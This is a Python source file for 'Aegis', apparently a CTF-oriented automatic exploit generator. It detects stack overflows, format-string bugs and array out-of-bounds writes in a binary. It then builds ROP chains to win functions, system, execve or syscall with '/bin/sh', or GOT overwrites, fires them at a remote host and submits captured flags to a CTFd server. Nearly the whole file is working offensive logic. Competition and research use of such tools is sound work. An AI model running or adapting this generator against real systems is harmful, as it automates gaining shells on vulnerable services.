#!/usr/bin/env python
import logging
import argparse
import os
import json
import requests
import ctypes

from pwn import *
from rage.rage import rAEG
from rage.machine import Machine
from rage.against import Against
from rage.log import aegis_log

class Aegis:
    """Class that does the control flow for analysis and execution."""

    def __init__(self, binary, libc, ip, port, ctfd, flag_format, id):
    
        self.binary = os.path.abspath(binary)
        self.elf = ELF(binary)
        self.rop = ROP(self.elf)

        self.libc = ELF(libc) if libc != None else self.elf.libc

        self.ip = ip
        self.port = port
        self.ctfd = ctfd
        self.chal_id = id
        self.flag_format = flag_format if flag_format is not None else "flag"

        self.access_token = os.environ.get("CTFD_TOK")
        self.headers = {
            "Authorization": f"Token {self.access_token}",
            "Content-Type" : "application/json",
        }

        self.symbol = rAEG(self.binary)
        self.machine = Machine(self.binary)
        
        self.static_analysis() 
        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port, self.flag_format)

        self.symbolic_padding = None
        self.padding = None
        self.failed = False
        self.has_format = False
        self.array_write = None
        self.got_targets = None

    def static_analysis(self):
        self.machine.check_mitigations()
        self.machine.check_vulnerable_copy()
        self.machine.check_vulnerable_input()
        self.array_write = self.machine.check_array_write()
        printf_addrs = self.machine.check_vulnerable_printf()

        if len(printf_addrs) > 0:
            self.has_format = True 
            self.got_targets = self.machine.find_target_got_entries(printf_addrs[0])
        else:
            self.got_targets = self.machine.get_got_functions("vuln")


    def symbolic_analysis(self):
        if self.array_write == (None, None):
            self.symbol.stack_smash()
            self.symbolic_padding = self.symbol.symbolic_padding
        
            if not self.has_format:
                self.has_format = self.symbol.has_format 

            if self.has_format == True:
                aegis_log.info(f"Found printf format string vulnerability")

    def setup_exploit(self):
        
        self.against.chain = b""

        win_gadget = self.machine.find_win_gadget()
        win_function = None

        if win_gadget != None:
            win_function = self.machine.bv.get_functions_containing(win_gadget)
            win_function = win_function[0] if len(win_function) >= 1 else None
            win_function = win_function.name if win_function != None else None
        
        function = self.machine.find_functions(["win", "system", "execve", "syscall"])
        string = self.machine.find_string_address()
        writeable = self.machine.find_writeable_address()

        function = function[0] if len(function) > 0 else None
        self.against.padding = self.symbolic_padding if self.symbolic_padding != None else b"A" * self.machine.padding_size

        # Either Format String Vuln or Array Out of Bounds
        if len(self.against.padding) == 0:
            aegis_log.warning(f"Could not find buffer overflow")

            if self.has_format == True:
                self.against.format_leak("")
                if self.against.flag == None:
                    if "pwnme" in self.elf.sym.keys(): 
                        self.against.format_write(1337, self.elf.sym["pwnme"])
                        self.exploit()
                    else:
                        got_addr = self.elf.got[self.got_targets[-1]]
                        if function == "win":
                            self.against.format_write(self.elf.sym["win"], got_addr)
                            self.exploit()
                        elif win_gadget:
                            self.against.format_write(win_gadget, got_addr)
                            self.exploit()
                else:
                    aegis_log.info(f"Found local flag through stack leak: {self.against.flag}")
                    self.remote_wait()

                    self.against.format_leak("REMOTE")
                    if self.against.remote_flag != None:
                        aegis_log.info(f"Found remote flag through stack leak: {self.against.remote_flag}")
                        self.send_flag(self.against.remote_flag)
                    self.remote_signal()
            else:
                got_addr = self.elf.got[self.got_targets[-1]]
                if self.array_write != (None, None):
                    index = (got_addr - self.array_write[0]) // self.array_write[1]
                    rem = (got_addr - self.array_write[0]) % self.array_write[1] 

                    start_addr = self.array_write[0] + index * self.array_write[1]
                    end_addr = start_addr + self.array_write[1]

                    aegis_log.debug(f"Writing to {hex(got_addr)} with index {index} and {rem}")
                    aegis_log.debug(f"Start of write {hex(start_addr)}, End of write {hex(end_addr)}")

                    system_plt = self.elf.plt["system"] + 0x6
                    system_got = self.elf.got["system"]
                    addr = start_addr
                    edit = b"" 
                    size = self.array_write[1]
                    while size > 0:
                        if rem == 0:
                            check = self.elf.sym["win"] & 0xff
                            if check == 0xa:
                                edit += p64(self.elf.sym["win"]+1)
                            else:
                                edit += p64(self.elf.sym["win"])
                        elif addr == system_got:
                            edit += p64(system_plt)
                        else:
                            edit += b"A" * 8
                        rem -= 8
                        size -= 8

                    self.against.array_exploit = [index, edit]
                    self.exploit()

        # Stack Based Buffer Overflow ROP
        else: 
            if function == "win" or win_function:
                func = "win" if function == "win" else win_function
                goal_addr = self.machine.get_goal_addr(func)
                params = self.machine.find_path(func, goal_addr)
                aegis_log.debug(f"Setting up return to win with function with parameters {params}")
                self.against.chain += self.against.rop_chain_call_function(func, params)
                self.against.exploit = self.against.padding + self.against.chain

            elif function == "system":
                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                    aegis_log.debug(f"Setting up return to system with parameters {hex(writeable)}")
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string])
                    aegis_log.debug(f"Setting up return to system with parameters {hex(string)}")
                self.against.exploit = self.against.padding + self.against.chain
            elif function == "execve":
                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable, 0, 0])
                    aegis_log.debug(f"Setting up return to execve with parameters {hex(writeable)}")
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
                    aegis_log.debug(f"Setting up return to execve with parameters {hex(string)}")
                self.against.exploit = self.against.padding + self.against.chain
            elif function == "syscall":

                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [59, writeable, 0, 0])
                    aegis_log.debug(f"Setting up return to syscall with paramters {[59, hex(writeable)]}")
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
                    aegis_log.debug(f"Setting up return to syscall with paramters {[59, hex(string)]}")
                self.against.exploit = self.against.padding + self.against.chain
            else:
                if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.debug(f"Setting up return to puts")
                    self.against.chain = self.against.rop_ret2puts()
                elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.debug(f"Setting up return to dlresolve")
                    self.against.chain = self.against.rop_chain_dlresolve()
            self.exploit()
            

    def write_solve_script(self):
        """Write the solve to a script for writeup purposes."""
        #! TODO

    def send_flag(self, flag):
        """Sends the flag to ctfd service"""
        if self.ctfd == None or self.id == None:
            return 
        challenge_url = f"{self.ctfd}/api/v1/challenges/attempt"
        data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
        response = requests.post(challenge_url, headers=self.headers, data=data)
        json_data = response.json()
        message = json_data["data"]["message"]

        aegis_log.critical(f"Response from remote server {message} for {flag}")



    def remote_wait(self):
        sem = os.getenv("SEM")
        #print(f"Semaphore Wait Value {os.getenv('SEM')}")
        while int(sem) <= 0:
            sleep(1)
        os.environ["SEM"] = str(int(sem) - 1)
        #print(f"Semaphore Wait Value {os.getenv('SEM')}")
            
    def remote_signal(self):
        sem = os.getenv("SEM")
        #print(f"Semaphore Signal Value {os.getenv('SEM')}")
        os.environ["SEM"] = str(int(sem) + 1)
        #print(f"Semaphore Signal Value {os.getenv('SEM')}")

    def exploit(self):
        """Create and run exploit using Against module."""
        aegis_log.debug(f"Setting up exploit")
        chain_len = len(self.against.chain) if self.against.chain is not None else 0
        format_len = len(self.against.format_exploit) if self.against.format_exploit is not None else 0

        if chain_len > 0:
            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
        else:
            if self.against.format_exploit != None:
                aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")

        option = "GDB" if args.GDB else ""

        self.against.process = self.against.start(option)
        self.against.send_exploit()
        if self.against.verify_flag() == False:
            aegis_log.debug(f"Adding ret to chain")
            ret = p64(self.rop.find_gadget(["ret"])[0])
            chain_len = len(self.against.chain)
            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
            self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]

            self.against.process = self.against.start(option)
            self.against.send_exploit()
            self.against.verify_flag()

            if self.against.flag != None:
                #self.remote_wait()  
                self.against.process = self.against.start("REMOTE")
                self.against.send_exploit()                    
                aegis_log.debug(f"Sent exploit to remote at {self.ip}")
                if self.against.verify_flag() == True:
                    self.send_flag(self.against.flag) 

                #self.remote_signal()
                                    
        else:
            if self.against.flag != None:
                #self.remote_wait()
                self.against.process = self.against.start("REMOTE")
                self.against.send_exploit()
                if self.against.verify_flag() == True:
                    self.send_flag(self.against.flag) 
                aegis_log.debug(f"Sent exploit to remote at {self.ip}")
                #self.remote_signal()

 
def print_title():

    aegis_title = """
  ▄████████    ▄████████    ▄██████▄   ▄█     ▄████████
  ███    ███   ███    ███   ███    ███ ███    ███    ███
  ███    ███   ███    █▀    ███    █▀  ███▌   ███    █▀
  ███    ███  ▄███▄▄▄      ▄███        ███▌   ███
▀███████████ ▀▀███▀▀▀     ▀▀███ ████▄  ███▌ ▀███████████
  ███    ███   ███    █▄    ███    ███ ███           ███
  ███    ███   ███    ███   ███    ███ ███     ▄█    ███
  ███    █▀    ██████████   ████████▀  █▀    ▄████████▀    
    """


    shield_1 = """
                  ██                                          
              ████░░████                                      
          ████░░░░░░░░░░████                                  
      ████░░░░░░░░░░░░░░░░░░████                              
██████░░░░▒▒▒▒░░░░░░░░░░▓▓▓▓░░░░██████                        
██░░░░░░▓▓▒▒▓▓▓▓░░░░░░▓▓▓▓▒▒▓▓░░░░░░██                        
██░░░░░░░░▒▒░░▓▓▓▓▒▒▓▓▓▓░░▓▓░░░░░░░░██                        
██░░░░░░▒▒▓▓░░▒▒▒▒  ▓▓▓▓░░▓▓▒▒░░░░░░██                        
██░░▓▓▓▓▓▓░░▒▒▒▒      ▓▓▓▓░░▓▓▓▓▓▓░░██                        
  ██░░▓▓░░▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓░░▓▓░░██                          
  ██░░▒▒▒▒▓▓      ▒▒      ▒▒▒▒▓▓░░██                          
  ██░░▓▓▓▓▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓░░██                          
  ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                          
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░██                            
      ██░░▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒░░██                              
      ██░░▓▓▓▓▒▒▓▓▒▒▒▒▒▒▓▓▓▓░░██                              
        ██░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓░░██                                
          ██░░▓▓░░░░░░▓▓░░██                                  
            ██░░░░░░░░░░██                                    
              ████░░████                                      
                  ██                                          

    """

    pillar = """      
    ░░▒▒▒▒░░▒▒░░░░░░     
  ░░░░░░░░░░░░░░░░░░░░   
  ░░░░░░░░░░▒▒░░░░░░     
    ░░▒▒▒▒▒▒░░░░░░░░     
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░▒▒░░       
      ▒▒▒▒▒▒░░▒▒░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
    ▒▒▒▒▒▒░░░░░░░░░░     
    ▒▒▒▒░░░░░░░░░░░░     
    ▒▒▒▒▒▒▒▒░░░░░░░░   
    """
    #print(aegis_title)
    #print(pillar)

if __name__ == "__main__":
    logging.getLogger("angr").setLevel(logging.CRITICAL)
    #logging.getLogger("angr").setLevel(logging.DEBUG)
    logging.getLogger("os").setLevel(logging.CRITICAL)
    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
    logging.getLogger("aegis_log").setLevel(logging.DEBUG)
    #logging.getLogger("aegis_log").setLevel(logging.CRITICAL)

    parser = argparse.ArgumentParser( 
        prog = "Aegis", 
        description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
    )

    parser.add_argument("-bin", metavar="binary", type=str, help="The binary that is to be exploited", default=None)
    parser.add_argument("-libc", metavar="libc", type=str, help="The libc shared library object linked to the binary", default=None)
    parser.add_argument("-ip", metavar="ip", type=str, help="The ip address of the remote challenge or connection info", default=None)
    parser.add_argument("-port", metavar="port", type=str, help="The port of the remote challenge", default=None)
    parser.add_argument("-login", metavar="login", type=str, help="Your login to your ctfd account", default=None)
    parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
    parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)
    parser.add_argument("-id", metavar="challengeid", type=str, help="The ctfd challenge id", default=None)

    # Set argument for limited logging for multiple binaries
    if args.BATCH:
        logging.getLogger("aegis_log").setLevel(logging.CRITICAL)

    arguments = parser.parse_args()
    print_title()

    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, None, arguments.id)
    aeg.static_analysis()
    aeg.symbolic_analysis()
    aeg.setup_exploit()
